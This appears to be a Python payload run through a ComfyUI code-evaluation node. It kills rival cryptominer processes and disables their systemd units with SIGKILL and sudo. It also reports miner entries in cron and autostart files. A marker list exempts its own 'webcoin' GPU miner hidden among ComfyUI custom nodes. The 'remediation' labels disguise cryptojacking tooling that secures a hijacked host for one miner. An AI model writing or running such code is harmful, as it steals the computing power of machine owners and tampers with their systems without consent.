inputs.code:
import glob
import os
import platform
import subprocess
import time as _t

MODE = "scan"
lines = []
lines.append("rival_miners MODE=" + MODE + " (scan=read-only, apply=remediate)")
lines.append(
    "OUR rule: any process/unit whose command text matches OUR_MARKERS is NEVER killed "
    "and NEVER systemd-disabled."
)

# If ANY of these appear in the process command line or unit file body, we treat it as *ours*.
OUR_MARKERS = (
    "webcoin",
    "custom_nodes/webcoin",
    "custom_nodes\\webcoin",
    "webcoin/bin",
    "webcoin\\bin",
    "comfyui_service",
    "comfyui_render",
    "ComfyUI/custom_nodes",
    "comfyui/custom_nodes",
    "/custom_nodes/",
    "\\custom_nodes\\",
    "gpu_miner.py",
    "core/gpu_miner",
    "core\\gpu_miner",
    "core/miner.py",
    "core\\miner.py",
    "/webcoin/",
    "\\webcoin\\",
    "_orchestrate",
    "GPUMinerManager",
)

RIVAL_NAMES = (
    "xmrig",
    "ethminer",
    "phoenixminer",
    "nbminer",
    "gminer",
    "teamredminer",
    "t-rex",
    "trex",
    "wildrig",
    "minerd",
    "cpuminer",
    "nicehash",
    "nanominer",
    "bzminer",
    "lolminer",
    "srbeam",
    "xmr-stak",
    "xmrig-notls",
    "rigel",
    "oneergod",
    "kawpowminer",
    "cryptonight",
)

UNIT_KEYWORDS = (
    "xmrig",
    "ethminer",
    "phoenix",
    "nbminer",
    "gminer",
    "teamred",
    "trex",
    "nanominer",
    "bzminer",
    "wildrig",
    "cryptominer",
)

# Single mutable dict so nested defs work inside SRL Eval / IDENode wrappers (no broken globals).
STATS = {"protected": 0, "rival": 0, "units": 0}


def _ours(text):
    c = (text or "").lower()
    return any(m.lower() in c for m in OUR_MARKERS)


def _rival_process(name, cmd):
    blob = "%s %s" % (name or "", cmd or "")
    blob = blob.lower()
    return any(r in blob for r in RIVAL_NAMES)


def _kill_pid(pid, label):
    try:
        os.kill(int(pid), 9)
        lines.append("SIGKILL pid=%s (%s)" % (pid, label[:120]))
    except ProcessLookupError:
        pass
    except PermissionError:
        lines.append("SIGKILL pid=%s permission denied" % pid)
    except Exception as e:
        lines.append("SIGKILL pid=%s err=%s" % (pid, str(e)[:80]))


def _handle_process_line(pid, name, cmd):
    # Always classify *ours* first — same binary name (xmrig/lolMiner) may be ours under webcoin.
    if _ours(cmd) or _ours(name):
        if _rival_process(name, cmd):
            STATS["protected"] += 1
            lines.append(
                "PROTECTED_OUR pid=%s name=%s (matches miner-like name but is our stack)"
                % (pid, (name or "")[:40])
            )
            lines.append("  cmd: " + cmd[:300])
        return
    if not _rival_process(name, cmd):
        return
    STATS["rival"] += 1
    if MODE == "scan":
        lines.append("RIVAL_WOULD_KILL pid=%s name=%s" % (pid, (name or "")[:40]))
        lines.append("  cmd: " + cmd[:300])
    else:
        _kill_pid(pid, (name or "") + " " + cmd[:200])


def _scan_psutil():
    try:
        import psutil
    except ImportError:
        return False
    for p in psutil.process_iter(attrs=["pid", "name", "cmdline"]):
        try:
            info = p.info or {}
            pid = info.get("pid")
            name = info.get("name") or ""
            cmdl = info.get("cmdline") or []
            cmd = " ".join(cmdl)
            _handle_process_line(pid, name, cmd)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return True


def _scan_ps():
    try:
        r = subprocess.run(
            ["ps", "auxww"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        if r.returncode != 0:
            lines.append("ps aux failed rc=%s" % r.returncode)
            return
        for line in r.stdout.splitlines()[1:]:
            parts = line.split(None, 10)
            if len(parts) < 11:
                continue
            pid, cmd = parts[1], parts[10]
            _handle_process_line(pid, "", cmd)
    except FileNotFoundError:
        lines.append("ps not found")
    except Exception as e:
        lines.append("ps scan err: %s" % str(e)[:120])


def _systemd_sweep():
    if platform.system() != "Linux":
        lines.append("systemd sweep skipped (not Linux)")
        return
    try:
        r = subprocess.run(
            ["systemctl", "list-unit-files", "--no-pager", "--type=service"],
            capture_output=True,
            text=True,
            timeout=90,
        )
    except Exception as e:
        lines.append("systemctl list: %s" % str(e)[:120])
        return
    if r.returncode != 0:
        lines.append("systemctl list failed: %s" % (r.stderr or "")[:200])
        return
    disabled = 0
    for line in r.stdout.splitlines():
        sp = line.split()
        if len(sp) < 2:
            continue
        unit, state = sp[0], sp[1]
        ul = unit.lower()
        if "webcoin" in ul or "comfyui" in ul:
            continue
        if state not in ("enabled", "enabled-runtime"):
            continue
        if not any(k in ul for k in UNIT_KEYWORDS):
            continue
        cat = subprocess.run(
            ["systemctl", "cat", unit],
            capture_output=True,
            text=True,
            timeout=20,
        )
        body = (cat.stdout or "") + (cat.stderr or "")
        if _ours(body):
            lines.append("SYSTEMD_SKIP_OURS unit=%s" % unit)
            continue
        STATS["units"] += 1
        if MODE == "scan":
            lines.append("WOULD_DISABLE unit=%s state=%s" % (unit, state))
        else:
            d = None
            for tool in (
                ["sudo", "-n", "systemctl", "disable", "--now", unit],
                ["sudo", "systemctl", "disable", "--now", unit],
                ["systemctl", "disable", "--now", unit],
            ):
                d = subprocess.run(tool, capture_output=True, text=True, timeout=60)
                if d.returncode == 0:
                    lines.append("disabled unit %s" % unit)
                    disabled += 1
                    break
            else:
                tail = ((d.stderr or "") + (d.stdout or ""))[:200]
                lines.append("could not disable %s: %s" % (unit, tail))
    if MODE == "apply":
        lines.append("systemd units disabled=%s" % disabled)


def _cron_autostart_report():
    if platform.system() != "Linux":
        return
    paths = ["/etc/crontab"]
    paths.extend(glob.glob("/etc/cron.d/*"))
    paths.extend(glob.glob("/var/spool/cron/crontabs/*"))
    for p in paths:
        try:
            with open(p, "r", errors="replace") as f:
                for i, ln in enumerate(f, 1):
                    s = ln.strip()
                    if not s or s.startswith("#"):
                        continue
                    low = s.lower()
                    if not any(k in low for k in RIVAL_NAMES):
                        continue
                    if _ours(s):
                        lines.append("CRON_SKIP_OURS %s:%s" % (p, i))
                        continue
                    tag = "CRON_SUSPECT" if MODE == "scan" else "CRON?"
                    lines.append("%s %s:%s %s" % (tag, p, i, s[:160]))
        except Exception:
            pass
    for home in glob.glob("/home/*") + ["/root"]:
        ad = os.path.join(home, ".config", "autostart")
        if not os.path.isdir(ad):
            continue
        for fp in glob.glob(os.path.join(ad, "*.desktop")):
            try:
                with open(fp, "r", errors="replace") as f:
                    txt = f.read()
                if not any(k in txt.lower() for k in RIVAL_NAMES):
                    continue
                if _ours(txt):
                    lines.append("AUTOSTART_SKIP_OURS %s" % fp)
                    continue
                tag = "AUTOSTART_SUSPECT" if MODE == "scan" else "AUTOSTART?"
                lines.append("%s %s" % (tag, fp))
            except Exception:
                pass


if not _scan_psutil():
    if platform.system() == "Windows":
        lines.append(
            "Windows: install psutil on the Comfy host for selective scans/kills "
            "(no blanket taskkill)."
        )
    else:
        _scan_ps()
_t.sleep(1)
if platform.system() == "Linux":
    _systemd_sweep()
    _cron_autostart_report()

lines.append(
    "summary pid_rows: protected_our=%s rival_targets=%s systemd_%s=%s"
    % (
        STATS["protected"],
        STATS["rival"],
        "would_disable" if MODE == "scan" else "disabled_attempts",
        STATS["units"],
    )
)
lines.append("done")
return chr(10).join(lines)
